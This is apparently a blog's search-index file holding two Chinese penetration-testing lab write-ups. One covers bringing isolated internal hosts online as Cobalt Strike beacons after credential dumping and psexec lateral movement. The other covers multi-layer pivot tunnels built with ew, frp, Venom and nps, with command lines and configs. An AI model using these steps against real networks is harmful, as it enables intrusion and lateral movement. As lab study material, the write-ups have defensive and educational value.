<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>不出网主机上线的几种方式</title>
    <link href="/2021/09/23/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
    <url>/2021/09/23/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>拿到一台边缘机器后，内网的机器很有可能大多数都不出网，这时又想上线cs方便后续操作。本文就如何上线不出网主机的方式进行了总结。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="目标内网机器"><a href="#目标内网机器" class="headerlink" title="目标内网机器"></a>目标内网机器</h3><ul><li><p>os：win server 2012</p></li><li><p>ip：192.168.57.137</p></li></ul><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/1.png"></p><h3 id="边缘机器"><a href="#边缘机器" class="headerlink" title="边缘机器"></a>边缘机器</h3><ul><li><p>os：win server 2012</p></li><li><p>ip1：192.168.1.103（出网）</p></li><li><p>ip2：192.168.57.136</p></li></ul><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/2.png"></p><h3 id="攻击机器"><a href="#攻击机器" class="headerlink" title="攻击机器"></a>攻击机器</h3><ul><li>os：kali liunx</li><li>ip：192.168.1.128</li></ul><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/3.png"></p><ul><li>os：ubutu 16.04</li><li>vps ip：47.xxxxxxxx</li></ul><p>由于边缘主机出网，选择reverse反向连接，现在已经上线边缘主机</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/4.png"></p><h2 id="SMB-Beacon"><a href="#SMB-Beacon" class="headerlink" title="SMB Beacon"></a>SMB Beacon</h2><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/10.png"></p><p>该方法通过已有的父Beacon使用SMB协议进行正向连接不出网机器，要求目标开启445端口，通过命名管道进行认证即可上线。其实有点像psexec这样的工具，有用户名和hash后，即可执行远程命令，其原理相似。内网的机器密码相同的情况很多，这也是为什么现在为了提高安全性不能批量设置密码，内网渗透一但有了密码往往有时候就宣告结束。</p><p>并且有个好处就是SMB协议一般防火墙是不拦截的，在一定程度上可以规避防火墙拦截。</p><p>先使用hashdump和logonpasswords命令抓一波密码。由于这里是win2012系统，是无法直接抓取明文密码的，这里也不需要去修改注册表，或者通过mimilib.dll注入的方式去获取明文密码，有hash就足够了，SMB验证身份本身用的就是NTMLv2协议。</p><p>这里是抓到了该机器上的hash</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/5.png"></p><blockquote><p>有个小tips，如果对方机器是64位的，最好就用x64的exe上线就可以了，以前我觉得x32和x64都行。虽然都可以上线，但是如果用的是x32的beacon，很有可能是抓不到64位机器上的密码的，使用cs集成的mimikatz会提示：32位的mimikatz无法抓取到64位机器的密码。所以目标是最好就用64位就用64位的artifact。</p></blockquote><p>然后通过端口扫描，发现内网机器：</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/6.png"></p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/7.png"></p><p>到这里不懂原理的小白(我)可能就会直接使用cs自带的psexec功能直接去横向，恰巧我之前就是这么做的，想起来还挺有意思的。</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/8.png"></p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/9.png"></p><p>结果就是服务已经创建了，但是上不了线，那会儿自己心里想肯定是cs出bug了，还烦了一会儿，现在想起来真的好笑。</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/11.png"></p><p>本身是没有问题的，说明psexec已经成功的完成了ntml认证，并且认证成功，但是这时候shell是反弹给边缘机器的，如果要上线就要再新建一个SMB Beacon Listener。相当于通过边缘机器再中转一下，反弹shell到vps。</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/12.png"></p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/13.png"></p><p>选择子Beacon：SMB Beacon。成功上线。</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/14.png"></p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/15.png"></p><p>（出去吃个饭回来内网机器ip变了。。）</p><p>这里可以看下拓扑图，是通过边缘机器正向连接了不出网的内网主机。</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/16.png"></p><p>在external后面有一个oooo，这实际上是标明了当前SMB的连接状态：</p><blockquote><p>SMB Beacon有两个命令：link，unlink。</p></blockquote><p>unlink则会断开连接，link会重新连接</p><p>执行命令unlink</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">unlink</span> <span class="hljs-number">192.168.57.140</span><br></code></pre></td></tr></table></figure><p>后面的oooo变成了oo oo，说明已经断开连接，但是只是断开了连接，进程并没有被杀掉。</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/17.png"></p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/18.png"></p><p>使用命令重新回连：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">link</span> <span class="hljs-number">192.168.57.140</span><br></code></pre></td></tr></table></figure><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/19.png"></p><blockquote><p>我在实战中暂时没有用到过这个功能，但应该是有一定作用的，持久化后门，更加隐蔽？这里具体的实战情景明白的师傅可以说一下。</p></blockquote><h2 id="TCP-Beacon"><a href="#TCP-Beacon" class="headerlink" title="TCP Beacon"></a>TCP Beacon</h2><p>这种方式一般试用于：密码撞不上，内网机器有web服务。</p><p>这里做个代理，假设已经写入了shell文件，用冰蝎挂代理去连webshell。</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/22.png"></p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/21.png"></p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/20.png"></p><p>在cs上新增一个Listen，Tcp Beacon</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/23.png"></p><p>横向的时候最好都使用这个带s的windows可执行文件，s的含义为Stageless，相对的是Stager。下面是我自己的理解：</p><blockquote><p>Stager是分步式的，只用少部分代码来请求和加载payload，cs的加载payload模式为反射加载beacon.dll，但这个beacon.dll并不在可执行文件中，而是在远程C2服务端。</p><p>Stageless则是将beacon.dll包含在可执行文件中，并且可能有写额外的操作，于是文件比较大，特征也更明显，但是适合横向不出网机器，因为不出网所以有可能请求不了c2服务端上的beacon.dll。</p></blockquote><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/24.png"></p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/25.png"></p><p>Stageless的可执行文件比Stager的可执行文件大了将近15倍。真的离谱。</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/26.png"></p><p>然后用冰蝎上传beacon.exe。然后执行</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/27.png"></p><p>执行后使用connect 命令连接：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">connect</span> <span class="hljs-number">192.168.57.140</span><br></code></pre></td></tr></table></figure><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/28.png"></p><p>拓扑图如下，为tcp正向连接：</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/29.png"></p><p>同样是可以使用unlink来断开连接，这里与SMB Beacon不一样的是，如果Beacon进程是以普通权限运行的话，进程会直接死掉，再connect就会失败。</p><p>这里由于是Administrator权限，unlink后可以通过connect重新连接回来。</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/30.png"></p><h2 id="Reverse-TCP-Beacon"><a href="#Reverse-TCP-Beacon" class="headerlink" title="Reverse TCP Beacon"></a>Reverse TCP Beacon</h2><p>也可以被称为中继上线。</p><p>同样需要有内网web，传shell。右键跳板机shell，选择Pivoting-&gt;Listener。</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/31.png"></p><p>Listen Host为内网ip。</p><p>这里要注意一下，如果有多张网卡，这个默认的Listen Host是需要改的，需要填入同一网段的ip。</p><p>比如我这里的跳板机器就有两张网卡，默认填入的host是192.168.1.103，这个就需要改，因为内网不出网机器是无法访问到192.168.1.103这张网卡的，只能访问192.168.57.143（跳板机ip又变了）</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/32.png"></p><p>同样生成Stageless的可执行文件。</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/33.png"></p><p>上传后执行beacon.exe</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/34.png"></p><p>执行后回来看cs就已经上线，不需要link或者connect了。</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/35.png"></p><p>拓扑图为反向的tcp连接</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/36.png"></p><p>值得注意的是，中继方法无法unlink后重连，不管权限如何，一旦unlink后进程直接结束。要想重新上线只能重新执行beacon.exe。</p><p><img src="/img/cs%E4%B8%8A%E7%BA%BF%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA/37.png"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>实际情况下，由于环境原因，网络状况错综复杂。比如：stageless的可执行文件比较大，又因为挂了代理，传不上去怎么办。其实就可以将beacon.exe上传到跳板机器上，用windows自带的certutil工具，直接在内网机器上请求下载跳板机上的beacon.exe。这样确实是更加稳当的。</p><p>上面这个tips是我再看星球中的@emmm…师傅分享的pdf学到的，感谢分享。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>内网穿透之多层代理</title>
    <link href="/2021/09/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    <url>/2021/09/10/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天去参加省赛的时候做内网穿透这一块明显感觉不怎么熟练，平时看大部分文章都是讲的两层网络的穿透，在真实场景下，有时候是三层甚至四层，自己实践之后发现还是和两层网络差距比较大的。由于是三层网络，写起来图会比较多，选取了四款常用穿透软件：ew，nps，frp，venom进行试验。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>拓扑图如下：<br><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/15.png"></p><p>192.168.1.0/24模拟公网环境。</p><p>每台PC上都有一个web服务，内网主机除边缘win7外全部不出网，内网同网段之间的主机可以相互访问,不同网段相互隔离。</p><p>假设现在已经拿到边缘主机win7。（文中所指的win2012全部指左边这台）</p><p>由于环境中途崩了一次，从Venom开始ip有所变化，请见谅。</p><h2 id="ew"><a href="#ew" class="headerlink" title="ew"></a>ew</h2><p>先看下出不出网，ping一下win7发现是出网的，这种就可以使用反向连接。<br><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/2.png"></p><p>将ew上传至边缘机器。<br><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/5.png"></p><p>在攻击机上执行:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew_for_Win</span>.exe -s rcsocks -l <span class="hljs-number">1080</span> -e <span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/6.png"></p><p>在边缘机器上执行:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew_for_Win</span>.exe -s rssocks -d <span class="hljs-number">192.168.1.104</span> -e <span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><p>这时候回来看攻击机，就已经成功了。<br><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/7.png"></p><p>给浏览器设置一个代理，即可访问内网web。<br><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/8.png"></p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/9.png"></p><p>经过一系列操作，我们又写入了一个shell。<br>同样这里需要开启蚁剑代理。<br><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/10.png"></p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/11.png"></p><p>查看192.168.183.134这台主机是否出网，结果是不出网。</p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/16.png"></p><p>由于需要执行命令，我们得保证一级代理不能掉。所以这里我用了两个webshell工具，蚁剑和冰蝎。</p><p>蚁剑关闭代理，冰蝎开启sock5代理1080端口，冰蝎去连<code>192.168.183.134</code>这台不出网主机，蚁剑连接边缘机器<code>192.168.1.110</code>。</p><p>攻击机另起一个cmd，执行命令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew_for_Win</span>.exe -s lcx_listen -l <span class="hljs-number">3080</span> -e <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>注意这里的端口不要和刚刚1080端口重合。</p><p>不出网主机win2012执行命令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew_for_Win</span>.exe -s ssocksd -l <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/17.png"></p><p>这里没回显是正常的，但要保证一级代理不能掉。</p><p>再通过边缘机器打通192.168.1.110:8888 和 192.168.183.134:9999 之间的通讯隧道</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew_for_Win</span>.exe -s lcx_slave -d <span class="hljs-number">192.168.1.104</span> -e <span class="hljs-number">8888</span> -f <span class="hljs-number">192.168.183.134</span> -g <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/18.png"></p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/19.png"></p><p>这里同样的浏览器再挂个代理就可以了。</p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/20.png"></p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/21.png"></p><p>再拿webshell工具去连的话就另外再挂个3080代理就行了。</p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/22.png"></p><h2 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h2><p>攻击机配置frps.ini文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br></code></pre></td></tr></table></figure><p>边缘机器配置frpc.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">1.104</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><br><span class="hljs-section">[http_proxy]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">plugin</span>=socks5<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">6000</span><br></code></pre></td></tr></table></figure><p>攻击机执行命令</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">frps.exe -<span class="hljs-keyword">c</span> frps.ini<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/23.png"></p><p>边缘机器执行命令</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">frpc.exe ‐<span class="hljs-keyword">c</span> frpc.ini<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/24.png"></p><p>浏览器挂代理访问6000端口即可</p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/25.png"></p><p>拿到win2012的webshell权限后，准备进一步代理到<code>192.168.57.0/24</code>。一级代理不要掉。</p><p>攻击机配置<code>frps.ini</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_addr</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7788</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/31.png"></p><p>边缘主机win7配置<code>frps.ini</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_addr</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">183.131</span>  <br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7799</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/32.png"></p><p>同时配置win7主机上<code>frpc.ini</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">1.104</span> <br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7788</span>  <br><span class="hljs-section">[http_proxy]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">183.131</span>  <br><span class="hljs-attr">local_port</span> = <span class="hljs-number">1080</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">1080</span>  <br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/33.png"></p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/34.png"></p><p>同样上传frp到win2012上，配置<code>frpc.ini</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">183.131</span> <br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7799</span>        <br><span class="hljs-section">[http_proxy]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">1080</span> <br><span class="hljs-attr">plugin</span> = socks5<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/35.png"></p><p>执行<code>frpc.exe ‐c frpc.ini</code>，这里都是没什么回显。</p><p>设置代理1080</p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/36.png"></p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/37.png"></p><p>同样的写入shell之后webshell工具连接挂个代理就行了。</p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/38.png"></p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/39.png"></p><h2 id="Venom"><a href="#Venom" class="headerlink" title="Venom"></a>Venom</h2><p>此时ip发生变化：</p><ul><li><p>win7： 192.168.183.138       192.168.1.109</p></li><li><p>win2012： 192.168.183.139       192.168.57.136</p></li><li><p>核心机器win2012：192.168.57.137</p></li></ul><p>攻击机上执行</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">admin</span>.exe -l<span class="hljs-keyword">port</span> 9999<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/40.png"></p><p>边缘主机win7上执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">agent</span>.exe -rhost <span class="hljs-number">192.168.1.104</span> -rport <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/41.png"></p><p>回到攻击机器上就已经有了连接。</p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/42.png"></p><p>然后执行命令，将流量代理到7777端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">goto</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">socks</span> <span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/43.png"></p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/44.png"></p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/45.png"></p><p>这时win2012就可以访问了</p><p>通过冰蝎走代理，将<code>agent.exe</code>上传至win2012。</p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/46.png"></p><p>在攻击机上让节点一进行监听，也就是在边缘机器win7上等待win2012连接。</p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/47.png"></p><p>在win2012上执行命令连接win7：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">agent</span>.exe -rhost <span class="hljs-number">192.168.183.138</span> -rport <span class="hljs-number">9998</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/48.png"></p><p>这时在攻击机上使用show命令，查看节点，就可以发现已经有两个节点，选择节点2，并socks代理到本机9998端口。</p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/49.png"></p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/50.png"></p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/51.png"></p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/52.png"></p><h2 id="Nps"><a href="#Nps" class="headerlink" title="Nps"></a>Nps</h2><blockquote><p>这个工具我还是第一次用，由于有图形化界面，感觉这个工具还比较好用，不像frp要去目标机器配置文件，也比ew更加稳定。</p></blockquote><p>首先去官网下载nps和npc：<a href="https://github.com/ehang-io/nps/releases">https://github.com/ehang-io/nps/releases</a></p><p>这里我都是windows64位，下载这两个就可以了。</p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/53.png"></p><p>直接执行nps.exe(要注意端口，被占用了就修改conf文件)</p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/54.png"></p><p>然后访问127.0.0.1:8080，如果是vps上起的话就访问vps:8080，默认密码admin/123。登录后点击右侧客户端，然后新增：</p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/55.png"></p><p>这里可填可不填，留空的话会自动生成密匙，等会拿这个密匙来让边缘主机win7连接攻击机器。</p><p>这里ID和密匙等会要用。</p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/56.png"></p><p>点击右侧socks代理，新增。ID为上面的id，端口填一个没有被占用的端口就好了，保存后server就配置完毕了。</p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/57.png"></p><p>将npc上传至边缘机器win7，并执行命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">npc.exe <span class="hljs-attribute">-server</span>=ip:port <span class="hljs-attribute">-vkey</span>=服务端生成的key<br></code></pre></td></tr></table></figure><p>这里的port默认是8024，如果修改过nps.conf中的端口就是修改过后的端口，key就是上面服务端的密钥。</p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/58.png"></p><p>执行后可以看到连接已经变成在线，这时候就已经代理好了。</p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/59.png"></p><p>浏览器挂个代理或者用Proxifier都是可以的，前面因为一直都是用的浏览器这里还是用下Proxifier。</p><p>新增代理规则如下</p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/60.png"></p><p><img src="/img/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/61.png"></p><blockquote><p>做二层代理时候想了很久，翻遍全网都没有一个案例，我的想法是kali上去开一个nps服务端，然后msf添加路由，这是一种方式。</p></blockquote><blockquote><p>还有就是3389远程去连边缘主机win7，但是这样操作太敏感了。官方文档有如下这样的说明，但是没找到参数怎么用，这里就用3389勉强试一下，希望有懂的表哥指点。初次体验nps感觉不是很好，如果是只做一层代理还是可以。</p></blockquote><p><img 